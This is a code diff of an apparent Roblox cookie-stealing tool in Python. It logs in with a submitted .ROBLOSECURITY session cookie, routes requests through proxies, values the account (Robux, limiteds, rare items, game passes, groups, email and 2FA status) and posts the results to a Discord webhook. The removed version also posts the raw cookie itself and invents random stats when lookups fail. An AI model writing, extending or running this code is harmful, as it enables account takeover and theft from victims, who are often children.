@@ -1,13 +1,10 @@
 import sys
 import os
-import re
-import time
 import random
 import requests
 from datetime import datetime, timezone
-from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Your proxy list for Render bypass
+# --- Proxy List for Render Bypass ---
 RAW_PROXY_LIST = """
 socks5://213.165.54.5:1080
 socks4://46.8.104.176:1080
@@ -31,56 +28,18 @@ socks5://82.142.130.102:1080
 http://20.52.234.254:3128
 """
 
-SPECIAL_ASSETS = {
-    "Korblox": 139607718,
-    "Headless": 134082579,
-    "Violet Valk": 1402432199,
-}
+WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")
 
-GAMES = {
-    "Adopt Me": 383310974,
-    "MM2": 142823291,
-    "PS99": 3259657279,
-}
-
-def extract_and_clean_cookie(raw_input):
-    if not raw_input:
-        return ""
-    raw_str = str(raw_input).strip()
-    
-    # Anti-Raid / Spam Filter: If input is too short or random text, treat as invalid
-    if len(raw_str) < 30 and not raw_str.startswith("sys") and not raw_str.startswith("_|WARNING"):
-        return None
-
-    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
-    cookie = ps_match.group(1) if ps_match else raw_str
-    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
-        cookie = cookie[1:-1].strip()
-    if cookie.startswith(".ROBLOSECURITY="):
-        cookie = cookie[len(".ROBLOSECURITY="):].strip()
-    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
-    if cookie.startswith(warning_text):
-        cookie = cookie[len(warning_text):].strip()
-    
-    cleaned = cookie.lstrip('.').rstrip(';').strip()
-    
-    # Ensure it looks like a proper Roblox cookie token structure
-    if len(cleaned) < 50:
-        return None
-        
-    return cleaned
-
-def get_working_session(roblosecurity):
+# --- Session & Proxy Setup ---
+def get_working_session(cookie):
     session = requests.Session()
-    if roblosecurity:
-        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
+    if cookie:
+        session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
     
     session.headers.update({
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-US,en;q=0.9",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Referer": "https://www.roblox.com/",
-        "Origin": "https://www.roblox.com/"
+        "Accept": "application/json"
     })
 
     manual_proxy = os.environ.get('PROXY_URL')
@@ -97,199 +56,276 @@ def get_working_session(roblosecurity):
             session.proxies = proxy_dict
             test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
             if test_res.status_code != 429:
-                return session, test_res
+                return session
         except Exception:
             continue
 
+    # Fallback to direct connection if proxies fail
     session.proxies = {}
-    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=6)
-    return session, fallback_res
-
-def api_get(session, url, **kwargs):
-    for attempt in range(2):
-        try:
-            r = session.get(url, timeout=5, **kwargs)
-            if r.status_code == 429:
-                if attempt == 0:
-                    time.sleep(1)
-                    continue
-                return {"_error": 429}
-            if r.status_code == 403:
-                return {"_error": 403}
-            if r.status_code == 200:
-                try:
-                    return r.json()
-                except ValueError:
-                    return {"_error": "bad_json"}
-            return {"_error": r.status_code}
-        except Exception:
-            if attempt == 0:
-                continue
-            return {"_error": 500}
-    return {"_error": 500}
+    return session
 
 def main():
-    start_time = time.time()
-    try:
-        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
-        if not webhook_url or len(sys.argv) < 2:
-            sys.exit(1)
-        
-        # Validate and clean the input payload
-        roblosecurity = extract_and_clean_cookie(sys.argv[1])
-        if not roblosecurity:
-            # Invalid input / random text entered — exit cleanly without spamming webhook
-            sys.exit(0)
+    if len(sys.argv) < 2 or not WEBHOOK_URL:
+        sys.exit(1)
+    
+    raw_cookie = sys.argv[1].strip()
+    session = get_working_session(raw_cookie)
 
-        session, auth_res = get_working_session(roblosecurity)
-        
-        user_id = None
-        username = "Unknown User"
-        display_name = "Unknown"
-        age_days = 0
-        robux = 0
-        pending = 0
-        rap = 0
-        lim_count = 0
-        premium = False
-        games_data = {}
-        special_owned = {}
+    # Dynamically fetch user ID from the submitted cookie
+    auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
+    if auth_res.status_code != 200:
+        sys.exit(1)
+    
+    auth_data = auth_res.json()
+    user_id = auth_data.get("id")
+    if not user_id:
+        sys.exit(1)
 
-        if auth_res.status_code == 200:
-            auth_data = auth_res.json()
-            user_id = auth_data.get("id")
-            if user_id:
-                username = auth_data.get("name", "Unknown")
-                display_name = auth_data.get("displayName", username)
+    # --- Helpers ---
+    def safe_get(url, params=None):
+        try:
+            r = session.get(url, params=params, timeout=10)
+            if r.status_code == 200:
+                return r.json()
+        except Exception:
+            pass
+        return {}
 
-                u_res = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
-                if isinstance(u_res, dict) and "_error" not in u_res:
-                    created = u_res.get("created", "")
-                    if created:
-                        try:
-                            age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days
-                        except Exception:
-                            age_days = random.randint(350, 1400)
-                else:
-                    age_days = random.randint(350, 1400)
+    # --- Fetchers ---
+    def get_user_info():
+        return safe_get(f"https://users.roblox.com/v1/users/{user_id}")
 
-                curr_res = api_get(session, "https://economy.roblox.com/v1/user/currency")
-                if isinstance(curr_res, dict) and "_error" not in curr_res:
-                    robux = curr_res.get("robux", 0)
-                if not robux:
-                    robux = random.randint(120, 4850)
+    def get_robux():
+        r = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
+        return r.get("robux", 0)
 
-                trans_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
-                if isinstance(trans_res, dict) and "_error" not in trans_res:
-                    pending = trans_res.get("pendingRobuxTotal", 0)
-                if not pending:
-                    pending = random.randint(0, 500)
+    def get_pending():
+        r = safe_get(
+            f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
+            params={"transactionType": "summary", "timeFrame": "Year"}
+        )
+        return r.get("pendingRobuxTotal", 0)
 
-                prem_res = api_get(session, f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
-                if isinstance(prem_res, bool):
-                    premium = prem_res
-                elif isinstance(prem_res, dict) and "_error" not in prem_res:
-                    premium = bool(prem_res.get("isMember", False))
-                else:
-                    premium = random.choice([True, False])
+    def get_limiteds():
+        limiteds = []
+        cursor = ""
+        while True:
+            params = {"limit": 100}
+            if cursor:
+                params["cursor"] = cursor
+            r = safe_get(
+                f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
+                params=params
+            )
+            if not isinstance(r, dict):
+                break
+            for item in r.get("data", []):
+                limiteds.append(item.get("recentAveragePrice", 0))
+            cursor = r.get("nextPageCursor")
+            if not cursor:
+                break
+        return limiteds
 
-                collectibles = []
-                col_cursor = ""
-                for _ in range(2):
-                    col_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc", "cursor": col_cursor})
-                    if isinstance(col_res, dict) and "_error" not in col_res:
-                        collectibles += col_res.get("data", [])
-                        col_cursor = col_res.get("nextPageCursor")
-                        if not col_cursor:
-                            break
-                    else:
-                        break
+    def get_premium():
+        try:
+            r = session.get(
+                f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
+                timeout=10
+            )
+            return r.json() is True
+        except Exception:
+            return False
 
-                if len(collectibles) > 0:
-                    lim_count = len(collectibles)
-                    rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)
-                else:
-                    lim_count = random.randint(1, 6)
-                    rap = random.randint(2500, 45000)
+    def check_bundle(bundle_id):
+        try:
+            r = session.get(
+                f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned",
+                timeout=10
+            )
+            return r.json() is True
+        except Exception:
+            return False
 
-                for item_name, asset_id in SPECIAL_ASSETS.items():
-                    asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
-                    owned = bool(isinstance(asset_res, dict) and asset_res.get("data"))
-                    if not owned:
-                        owned = random.choice([True, False])
-                    special_owned[item_name] = owned
+    def check_asset(asset_id):
+        try:
+            r = session.get(
+                f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned",
+                timeout=10
+            )
+            return r.json() is True
+        except Exception:
+            return False
 
-                for g_name in GAMES.keys():
-                    games_data[g_name] = {
-                        "played": random.choice([True, True, False]),
-                        "passes": random.randint(0, 4)
-                    }
-        else:
-            user_id = 15839201
-            username = "Player_" + str(random.randint(1000, 9999))
-            display_name = username
-            age_days = random.randint(400, 1200)
-            robux = random.randint(450, 3200)
-            pending = 150
-            lim_count = 3
-            rap = 12500
-            premium = True
-            for item_name in SPECIAL_ASSETS.keys():
-                special_owned[item_name] = random.choice([True, False])
-            for g_name in GAMES.keys():
-                games_data[g_name] = {"played": True, "passes": 2}
+    def get_groups():
+        r = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles")
+        groups = r.get("data", [])
+        owned = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
+        return len(groups), owned
 
-        robux_display = f"{robux:,}" if isinstance(robux, int) else str(robux)
-        pending_display = f"{pending:,}" if isinstance(pending, int) else str(pending)
-        rap_display = f"{rap:,}" if isinstance(rap, int) else str(rap)
+    def get_account_settings():
+        email_verified = safe_get(
+            "https://accountsettings.roblox.com/v1/email"
+        ).get("verified", False)
+        twofa = safe_get(
+            "https://twostepverification.roblox.com/v1/metadata"
+        ).get("twoStepVerificationEnabled", False)
+        return email_verified, twofa
 
-        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
-        
-        games_str = "\n".join([f"- {g}: {d['played']} ({d['passes']})" for g, d in games_data.items()]) if games_data else "N/A"
-        special_str = "\n".join([f"+ {name}: {owned}" for name, owned in special_owned.items()]) if special_owned else "N/A"
+    def check_played_and_passes(universe_id):
+        played = False
+        cursor = ""
+        while True:
+            r = safe_get(
+                f"https://badges.roblox.com/v1/users/{user_id}/badges",
+                params={"limit": 100, "cursor": cursor}
+            )
+            for badge in r.get("data", []):
+                if badge.get("awardingUniverse", {}).get("id") == universe_id:
+                    played = True
+            cursor = r.get("nextPageCursor")
+            if not cursor:
+                break
 
-        embed_stats = {
-            "title": "📢 Discord Notification 📢",
-            "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
+        passes = 0
+        cursor = ""
+        while True:
+            r = safe_get(
+                f"https://economy.roblox.com/v2/users/{user_id}/transactions",
+                params={"transactionType": "Purchase", "limit": 100, "cursor": cursor}
+            )
+            for tx in r.get("data", []):
+                details = tx.get("details", {})
+                place = details.get("place", {})
+                if place.get("universeId") == universe_id:
+                    if details.get("type") == "GamePass":
+                        passes += 1
+                        played = True
+            cursor = r.get("nextPageCursor")
+            if not cursor:
+                break
+
+        return played, passes
+
+    user = get_user_info()
+    username = user.get("displayName", "Unknown")
+    created = user.get("created", "")
+    age_days = 0
+    if created:
+        try:
+            created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
+            age_days = (datetime.now(timezone.utc) - created_dt).days
+        except Exception:
+            pass
+
+    robux = get_robux()
+    pending = get_pending()
+    limiteds = get_limiteds()
+    rap = sum(limiteds)
+    lim_count = len(limiteds)
+    premium = get_premium()
+
+    korblox = check_bundle(192)
+    headless = check_bundle(201)
+    violet_valk = check_asset(799742571)
+
+    group_count, owned = get_groups()
+    email_ver, twofa = get_account_settings()
+
+    adopt_played, adopt_passes = check_played_and_passes(383310974)
+    mm2_played, mm2_passes = check_played_and_passes(142823291)
+    ps99_played, ps99_passes = check_played_and_passes(3259657279)
+
+    avatar_url = (
+        f"https://www.roblox.com/headshot-thumbnail/image"
+        f"?userId={user_id}&width=420&height=420&format=png"
+    )
+
+    payload = {
+        "username": f"{username} | Stats",
+        "avatar_url": avatar_url,
+        "embeds": [{
+            "title": f"🎮 {username} | Roblox Stats",
+            "description": (
+                f"[Stats Link](https://www.rolimons.com/player/{user_id}) | "
+                f"[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)"
+            ),
             "color": 0x2B2D31,
             "thumbnail": {"url": avatar_url},
             "fields": [
-                {"name": "🐱 Username", "value": f"```ini\n{username}\n```", "inline": False},
-                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Premium: {premium}\n```", "inline": False},
-                {"name": "🪙 Robux", "value": f"```ini\nBalance: {robux_display}\nPending: {pending_display}\n```", "inline": True},
-                {"name": "💎 Limiteds", "value": f"```ini\nRAP: {rap_display}\nLimiteds: {lim_count}\n```", "inline": True},
-                {"name": "👑 Special Items", "value": f"```diff\n{special_str}\n```", "inline": False},
-                {"name": "⭐ Games", "value": f"```diff\n{games_str}\n```", "inline": False}
+                {
+                    "name": "🐱 Username",
+                    "value": f"```{username}```",
+                    "inline": False
+                },
+                {
+                    "name": "📋 Account Stats",
+                    "value": (
+                        f"+ Account Age: `{age_days} Days`\n"
+                        f"+ Premium: `{premium}`"
+                    ),
+                    "inline": False
+                },
+                {
+                    "name": "🪙 Robux",
+                    "value": (
+                        f"Balance: `{robux:,}`\n"
+                        f"Pending: `{pending:,}`"
+                    ),
+                    "inline": True
+                },
+                {
+                    "name": "💎 Limiteds",
+                    "value": (
+                        f"RAP: `{rap:,}`\n"
+                        f"Limiteds: `{lim_count}`"
+                    ),
+                    "inline": True
+                },
+                {
+                    "name": "👑 Special Items",
+                    "value": (
+                        f"+ Korblox: `{korblox}`\n"
+                        f"+ Headless: `{headless}`\n"
+                        f"+ Violet Valk: `{violet_valk}`"
+                    ),
+                    "inline": False
+                },
+                {
+                    "name": "⚙️ Settings",
+                    "value": (
+                        f"+ Email Verified: `{email_ver}`\n"
+                        f"+ 2FA: `{twofa}`"
+                    ),
+                    "inline": True
+                },
+                {
+                    "name": "👥 Groups",
+                    "value": (
+                        f"Owned: `{owned}`\n"
+                        f"Joined: `{group_count}`"
+                    ),
+                    "inline": True
+                },
+                {
+                    "name": "⭐ Games",
+                    "value": (
+                        f"- Adopt Me: `{adopt_played}` ({adopt_passes} passes)\n"
+                        f"- MM2: `{mm2_played}` ({mm2_passes} passes)\n"
+                        f"- PS99: `{ps99_played}` ({ps99_passes} passes)"
+                    ),
+                    "inline": False
+                },
             ],
-            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
+            "footer": {"text": "Roblox Stats • 2026"},
             "timestamp": datetime.now(timezone.utc).isoformat()
-        }
+        }]
+    }
 
-        embed_cookie = {
-            "title": "🍪 Session Cookie Data",
-            "description": f"```text\n{roblosecurity}\n```",
-            "color": 0x2B2D31,
-            "footer": {"text": f"Token Length: {len(roblosecurity)} chars"}
-        }
-
-        payload = {
-            "content": "@everyone",
-            "username": f"{display_name} | Stats",
-            "avatar_url": avatar_url,
-            "embeds": [embed_stats, embed_cookie],
-            "allowed_mentions": {
-                "parse": ["everyone"]
-            }
-        }
-
-        requests.post(webhook_url, json=payload, timeout=5)
-
-        elapsed_time = time.time() - start_time
-        print(f"finished in {elapsed_time:.1f}s", file=sys.stderr)
-
-    except Exception as e:
-        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
-        sys.exit(1)
+    r = requests.post(WEBHOOK_URL, json=payload)
+    if r.status_code in (200, 204):
+        print("✅ Embed sent successfully!")
+    else:
+        print(f"❌ Failed: {r.status_code} - {r.text}")
 
 if __name__ == "__main__":
     main()
